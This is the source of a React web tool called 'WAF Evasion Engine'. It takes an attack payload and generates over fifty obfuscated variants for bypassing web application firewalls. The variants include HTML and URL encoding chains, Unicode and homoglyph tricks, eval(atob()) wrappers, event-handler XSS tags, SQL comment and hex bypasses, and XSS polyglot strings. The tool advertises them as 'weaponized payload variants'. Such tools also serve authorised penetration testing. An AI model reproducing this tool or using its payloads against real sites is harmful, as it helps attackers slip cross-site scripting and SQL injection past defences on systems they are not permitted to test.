import { useState, useMemo } from 'react';
import { ShieldOff, Copy, CheckCheck, Search, Zap, Filter } from 'lucide-react';
import '../styles/Tools.css';

// ============================================================
// WAF Evasion Techniques — 50+ chained obfuscation mutations
// ============================================================

const techniques = [
  // ── Case Mutations ──
  {
    group: 'Case Mutations', items: [
      { id: 'mixed', label: 'mIxEd CaSe', fn: s => s.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('') },
      { id: 'alt_upper', label: 'Alternating UPPER', fn: s => s.split('').map((c, i) => i % 3 === 0 ? c.toUpperCase() : c).join('') },
      { id: 'random_case', label: 'Random Case', fn: s => s.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('') },
      { id: 'upper_tags', label: 'Uppercase Tags Only', fn: s => s.replace(/<\/?[a-z]+/gi, m => m.toUpperCase()) },
    ]
  },

  // ── HTML Entity Obfuscation ──
  {
    group: 'HTML Entity Bypass', items: [
      { id: 'html_dec', label: 'HTML Decimal', fn: s => s.split('').map(c => `&#${c.charCodeAt(0)};`).join('') },
      { id: 'html_hex', label: 'HTML Hex', fn: s => s.split('').map(c => `&#x${c.charCodeAt(0).toString(16)};`).join('') },
      { id: 'html_nopad', label: 'HTML Hex (No Semicolon)', fn: s => s.split('').map(c => `&#x${c.charCodeAt(0).toString(16)}`).join('') },
      { id: 'html_zeropad', label: 'HTML Hex (Zero-Padded)', fn: s => s.split('').map(c => `&#x000${c.charCodeAt(0).toString(16)};`).join('') },
      { id: 'html_mixed', label: 'Mixed Entity/Plain', fn: s => s.split('').map((c, i) => i % 2 === 0 ? `&#${c.charCodeAt(0)};` : c).join('') },
      { id: 'html_named', label: 'Named Entities', fn: s => s.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&apos;') },
    ]
  },

  // ── URL Encoding ──
  {
    group: 'URL Encoding Chains', items: [
      { id: 'url_single', label: 'Single URL Encode', fn: s => encodeURIComponent(s) },
      { id: 'url_double', label: 'Double URL Encode', fn: s => encodeURIComponent(encodeURIComponent(s)) },
      { id: 'url_triple', label: 'Triple URL Encode', fn: s => encodeURIComponent(encodeURIComponent(encodeURIComponent(s))) },
      { id: 'url_selective', label: 'Selective URL (Tags Only)', fn: s => s.replace(/[<>"'\/\\()]/g, c => '%' + c.charCodeAt(0).toString(16).toUpperCase()) },
      { id: 'url_full', label: 'Full Percent Encode', fn: s => s.split('').map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase()).join('') },
    ]
  },

  // ── Unicode & Full-Width ──
  {
    group: 'Unicode Tricks', items: [
      { id: 'fullwidth', label: 'Full-Width Characters', fn: s => s.split('').map(c => { const code = c.charCodeAt(0); return (code >= 33 && code <= 126) ? String.fromCharCode(code + 0xFEE0) : c; }).join('') },
      { id: 'unicode_escape', label: 'Unicode \\u Escape', fn: s => s.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('') },
      { id: 'unicode_braces', label: 'Unicode \\u{} Escape', fn: s => s.split('').map(c => '\\u{' + c.charCodeAt(0).toString(16) + '}').join('') },
      { id: 'utf8_overlong', label: 'UTF-8 Overlong (2-byte)', fn: s => s.split('').map(c => { const b = c.charCodeAt(0); return '%' + (0xC0 | (b >> 6)).toString(16) + '%' + (0x80 | (b & 0x3F)).toString(16); }).join('') },
      { id: 'zero_width', label: 'Zero-Width Injector', fn: s => s.split('').join('\u200B') },
      { id: 'homoglyph', label: 'Homoglyph Swap', fn: s => s.replace(/a/gi, 'а').replace(/e/gi, 'е').replace(/o/gi, 'о').replace(/p/gi, 'р').replace(/c/gi, 'с').replace(/x/gi, 'х') },
    ]
  },

  // ── JavaScript Obfuscation ──
  {
    group: 'JavaScript Bypass', items: [
      { id: 'js_fromcharcode', label: 'String.fromCharCode', fn: s => `String.fromCharCode(${s.split('').map(c => c.charCodeAt(0)).join(',')})` },
      { id: 'js_eval_atob', label: 'eval(atob(...))', fn: s => `eval(atob('${btoa(s)}'))` },
      { id: 'js_constructor', label: 'Function Constructor', fn: s => `Function(atob('${btoa(s)}'))()` },
      { id: 'js_settimeout', label: 'setTimeout Bypass', fn: s => `setTimeout(atob('${btoa(s)}'))` },
      { id: 'js_template', label: 'Template Literal', fn: s => '`${' + s + '}`' },
      { id: 'js_concat', label: 'String Concat', fn: s => s.split('').map(c => `'${c}'`).join('+') },
      { id: 'js_reverse', label: 'Reverse + eval', fn: s => `eval('${s.split('').reverse().join('')}'.split('').reverse().join(''))` },
      { id: 'js_chararray', label: 'Char Array Join', fn: s => `[${s.split('').map(c => `'${c}'`).join(',')}].join('')` },
    ]
  },

  // ── Tag & Attribute Mutations ──
  {
    group: 'HTML/Tag Mutations', items: [
      { id: 'tag_slash', label: 'Extra Slash in Tag', fn: s => s.replace(/<(\w)/g, '<//$1') },
      { id: 'tag_space', label: 'Space Before >', fn: s => s.replace(/>/g, ' >').replace(/\/>/g, ' />') },
      { id: 'tag_tab', label: 'Tab in Tags', fn: s => s.replace(/<(\w+)/g, '<\t$1') },
      { id: 'tag_newline', label: 'Newline in Tags', fn: s => s.replace(/<(\w+)/g, '<\n$1') },
      { id: 'tag_null', label: 'Null Byte Injection', fn: s => s.replace(/<(\w+)/g, '<%00$1') },
      { id: 'svg_wrap', label: 'SVG Wrapper', fn: s => `<svg/onload=${s.replace(/<script>|<\/script>/gi, '')}>` },
      { id: 'img_onerror', label: 'IMG Onerror', fn: s => `<img src=x onerror="${s.replace(/<script>|<\/script>/gi, '')}">` },
      { id: 'body_onload', label: 'Body Onload', fn: s => `<body onload="${s.replace(/<script>|<\/script>/gi, '')}">` },
      { id: 'details_ontoggle', label: 'Details Ontoggle', fn: s => `<details open ontoggle="${s.replace(/<script>|<\/script>/gi, '')}">` },
      { id: 'marquee_event', label: 'Marquee Onstart', fn: s => `<marquee onstart="${s.replace(/<script>|<\/script>/gi, '')}">` },
      { id: 'input_onfocus', label: 'Input Autofocus', fn: s => `<input onfocus="${s.replace(/<script>|<\/script>/gi, '')}" autofocus>` },
    ]
  },

  // ── SQL WAF Bypass ──
  {
    group: 'SQL Bypass', items: [
      { id: 'sql_comments', label: 'Inline Comments', fn: s => s.replace(/\s+/g, '/**/') },
      { id: 'sql_double_dash', label: 'Double Dash Comment', fn: s => s + '-- -' },
      { id: 'sql_hash', label: 'Hash Comment', fn: s => s + '#' },
      { id: 'sql_version', label: 'MySQL Version Comment', fn: s => s.replace(/\s+/g, ' ').replace(/(UNION|SELECT|FROM|WHERE|AND|OR)/gi, m => `/*!${m}*/`) },
      { id: 'sql_hex_string', label: 'Hex String', fn: s => '0x' + s.split('').map(c => c.charCodeAt(0).toString(16)).join('') },
      { id: 'sql_char', label: 'CHAR() Encoding', fn: s => 'CHAR(' + s.split('').map(c => c.charCodeAt(0)).join(',') + ')' },
    ]
  },

  // ── Polyglot / Advanced ──
  {
    group: 'Polyglot & Advanced', items: [
      { id: 'poly_xss', label: 'XSS Polyglot', fn: () => `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0teleD/%0teleA//oNcliCk=alert()//><svg/onload=alert()>//` },
      { id: 'poly_script', label: 'Script Polyglot', fn: () => `'-alert(1)-'"><img/src=x onerror=alert(1)><svg/onload=alert(1)>{{alert(1)}}` },
      { id: 'cdata_wrap', label: 'CDATA Wrapper', fn: s => `<![CDATA[${s}]]>` },
      { id: 'comment_break', label: 'Comment Breakout', fn: s => `-->${s}<!--` },
      { id: 'concat_event', label: 'Event Handler Concat', fn: s => { const clean = s.replace(/<script>|<\/script>/gi, ''); return `<svg onload="a]${'l'.charCodeAt(0)}ert(1)">`.replace('a]108ert', 'alert'); } },
      { id: 'data_uri', label: 'Data URI Script', fn: s => `<a href="data:text/html;base64,${btoa(s)}">click</a>` },
      { id: 'js_uri', label: 'JavaScript URI', fn: s => `<a href="javascript:${encodeURIComponent(s.replace(/<script>|<\/script>/gi, ''))}">click</a>` },
    ]
  },
];

const allTechniques = techniques.flatMap(g => g.items);

export default function WAFEvasion() {
  const [input, setInput] = useState('<script>alert(1)</script>');
  const [searchQuery, setSearchQuery] = useState('');
  const [activeGroup, setActiveGroup] = useState('all');
  const [copiedId, setCopiedId] = useState(null);

  const handleCopy = (text, id) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1500);
  };

  const results = useMemo(() => {
    if (!input.trim()) return [];
    return allTechniques.map(t => {
      try {
        return { id: t.id, label: t.label, group: techniques.find(g => g.items.includes(t))?.group, output: t.fn(input) };
      } catch {
        return { id: t.id, label: t.label, group: techniques.find(g => g.items.includes(t))?.group, output: '[Error generating variant]' };
      }
    });
  }, [input]);

  const filtered = useMemo(() => {
    let list = results;
    if (activeGroup !== 'all') {
      list = list.filter(r => r.group === activeGroup);
    }
    if (searchQuery.trim()) {
      const q = searchQuery.toLowerCase();
      list = list.filter(r => r.label.toLowerCase().includes(q) || r.output.toLowerCase().includes(q));
    }
    return list;
  }, [results, activeGroup, searchQuery]);

  const groups = ['all', ...techniques.map(g => g.group)];

  return (
    <div className="tool-page page-enter">
      <div className="tool-header">
        <div className="tool-header-left">
          <ShieldOff size={28} />
          <div>
            <h1 className="tool-title">WAF Evasion Engine</h1>
            <p className="tool-subtitle">Generate 50+ weaponized payload variants to bypass WAF filters</p>
          </div>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <Zap size={16} style={{ color: 'var(--accent-yellow)' }} />
          <span style={{ fontSize: '13px', color: 'var(--text-muted)' }}>{filtered.length} variants</span>
        </div>
      </div>

      {/* Input */}
      <div style={{ marginBottom: '20px' }}>
        <label className="tool-label">INPUT PAYLOAD</label>
        <textarea
          className="tool-textarea"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          placeholder="Paste your payload here (e.g. <script>alert(1)</script>)"
          rows={3}
          style={{ fontFamily: 'var(--font-mono)', fontSize: '14px' }}
        />
      </div>

      {/* Filters */}
      <div style={{ display: 'flex', gap: '12px', marginBottom: '20px', alignItems: 'center', flexWrap: 'wrap' }}>
        <div className="recondb-search" style={{ flex: 1, minWidth: '200px', maxWidth: '320px' }}>
          <Search size={16} style={{ color: 'var(--text-muted)' }} />
          <input
            className="recondb-search-input"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder="Search techniques..."
          />
        </div>
        <div style={{ display: 'flex', gap: '4px', flexWrap: 'wrap' }}>
          {groups.map(g => (
            <button
              key={g}
              className={`encoder-btn ${activeGroup === g ? 'active' : ''}`}
              onClick={() => setActiveGroup(g)}
              style={{ fontSize: '11px', padding: '4px 10px', textTransform: g === 'all' ? 'uppercase' : 'none' }}
            >
              {g === 'all' ? 'All' : g}
            </button>
          ))}
        </div>
      </div>

      {/* Results */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', maxHeight: 'calc(100vh - 340px)', overflowY: 'auto', paddingRight: '8px' }}>
        {filtered.length === 0 ? (
          <div className="analyzer-empty" style={{ minHeight: '120px' }}>
            <p>{input.trim() ? 'No matching techniques found' : 'Enter a payload above to generate bypass variants'}</p>
          </div>
        ) : (
          filtered.map((r) => (
            <div
              key={r.id}
              style={{
                background: 'var(--bg-secondary)',
                border: '1px solid var(--border-subtle)',
                borderRadius: 'var(--radius-lg)',
                padding: '12px 16px',
                display: 'flex',
                flexDirection: 'column',
                gap: '6px',
                transition: 'border-color 0.2s ease',
              }}
              className="waf-result-card"
            >
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <span style={{
                    fontSize: '11px',
                    fontWeight: 700,
                    color: 'var(--accent-primary)',
                    textTransform: 'uppercase',
                    letterSpacing: '0.5px',
                  }}>{r.label}</span>
                  <span style={{
                    fontSize: '10px',
                    color: 'var(--text-muted)',
                    background: 'var(--bg-tertiary)',
                    padding: '2px 6px',
                    borderRadius: '4px',
                  }}>{r.group}</span>
                </div>
                <button
                  className="btn btn-ghost btn-sm"
                  onClick={() => handleCopy(r.output, r.id)}
                  style={{ padding: '4px 8px', minWidth: 'auto' }}
                >
                  {copiedId === r.id ? <CheckCheck size={14} style={{ color: 'var(--accent-green)' }} /> : <Copy size={14} />}
                </button>
              </div>
              <pre style={{
                fontFamily: 'var(--font-mono)',
                fontSize: '12px',
                color: 'var(--text-secondary)',
                background: 'var(--bg-tertiary)',
                padding: '8px 12px',
                borderRadius: 'var(--radius-md)',
                overflow: 'auto',
                maxHeight: '120px',
                margin: 0,
                whiteSpace: 'pre-wrap',
                wordBreak: 'break-all',
              }}>{r.output}</pre>
            </div>
          ))
        )}
      </div>
    </div>
  );
}
